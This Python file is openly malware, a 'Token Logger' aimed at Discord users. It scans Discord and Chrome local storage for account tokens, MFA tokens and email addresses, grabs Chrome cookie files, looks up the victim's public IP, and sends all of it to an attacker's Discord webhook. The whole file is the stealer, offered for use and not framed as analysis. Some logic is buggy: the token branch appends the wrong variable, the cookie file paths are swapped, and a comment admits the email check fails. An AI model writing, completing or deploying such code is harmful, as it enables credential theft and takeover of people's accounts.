import os
import re
import discord
import aiohttp
import asyncio
import requests


class Logger:
    def __init__(self, webhook):
        self.MFA_Regex = re.compile(r"mfa\.[\w-]{84}")
        self.Regular_Regex = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
        self.Email_Regex = re.compile(r"""(?:[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*|"(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*")@(?:(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?|\[(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?|[a-z0-9-]*[a-z0-9]:(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21-\x5a\x53-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])+)\])""")
        self.APPDATA = os.environ['APPDATA']
        self.LOCALAPPDATA = os.environ['LOCALAPPDATA']
        self.Vanilla_Client = f"{self.APPDATA}/discord/Local Storage/leveldb"
        self.Canary_Client = f"{self.APPDATA}/discordcanary/Local Storage/leveldb"
        self.Chrome_User_Data = f"{self.LOCALAPPDATA}/Google/Chrome/User Data/Default/"
        self.Chrome_Beta_User_Data = f"{self.LOCALAPPDATA}/Google/Chrome Beta/User Data/Default/"
        self.Tokens = []
        self.Emails = []
        self.webhook = webhook
        self.Cookies_Found = False
        self.Cookies_File = None
        self.Beta_Cookies_Found = False
        self.Beta_Cookies_File = None
        # def start():

    def start(self):
        self.init_scan()
        loop = asyncio.get_event_loop()
        loop.run_until_complete(self.send())


    def scan_path_files_for_token(self, path):
        if os.path.isdir(path):
            for file in os.listdir(path):
                try:
                    for f in open(f"{path}/{file}", errors="ignore").readlines():
                        token_mfa = self.MFA_Regex.findall(f)
                        if token_mfa:
                            self.Tokens.append(token_mfa[0])
                        token_vanilla = self.Regular_Regex.findall(f)
                        if token_vanilla:
                            self.Tokens.append(token_mfa[0])
                        email = self.Email_Regex.findall(f)
                        if email:
                            self.Emails.append(email[0])

                except PermissionError:
                    print("Permission error! (Ignored)")

    def init_scan(self):
        # Vanilla
        self.scan_path_files_for_token(self.Vanilla_Client)
        # Canary
        self.scan_path_files_for_token(self.Canary_Client)
        # Chrome
        self.scan_path_files_for_token(self.Chrome_User_Data)
        if os.path.isfile(self.Chrome_User_Data + "/Cookies"):
            self.Cookies_Found = True
            self.Cookies_File = discord.File(self.Chrome_User_Data + "/Local Storage/leveldb")
        # Chrome Beta
        self.scan_path_files_for_token(self.Chrome_Beta_User_Data)
        if os.path.isfile(self.Chrome_Beta_User_Data + "/Local Storage/leveldb"):
            self.Beta_Cookies_Found = True
            self.Beta_Cookies_File = discord.File(self.Chrome_Beta_User_Data + "/Cookies")

    async def send(self):
        webhook = self.webhook
        async with aiohttp.ClientSession() as session:
            w = discord.Webhook.from_url(webhook, adapter=discord.AsyncWebhookAdapter(session))

            # Tokens & IP Embed
            Token_Embed = discord.Embed(title="Token Logger", description="")
            Token_Embed.add_field(name="Discord Tokens", value="\n\n".join(self.Tokens), inline=False)
            Token_Embed.add_field(name="IP", value=requests.get("https://api.ipify.org").text)

            # Beta Cookies Embed
            Beta_Cookies = discord.Embed(title="Chrome Beta Cookies", description="")

            # Vanilla Cookies Embed
            Vanilla_Cookies = discord.Embed(title="Chrome Cookies", description="")

            if self.Beta_Cookies_Found:
                await w.send(embed=Beta_Cookies, file=self.Beta_Cookies_File)
            elif self.Cookies_Found:
                await w.send(embed=Vanilla_Cookies, file=self.Cookies_File)
            elif self.Emails: # This check doesn't actually work and idk why so deal with it
                file = open("Found_Emails.txt", "w+")
                file.write("\n".join(self.Emails))
                await w.send(file=discord.File(file))
                file.close()

            await w.send(embed=Token_Embed)


Logger("Webhook").start()
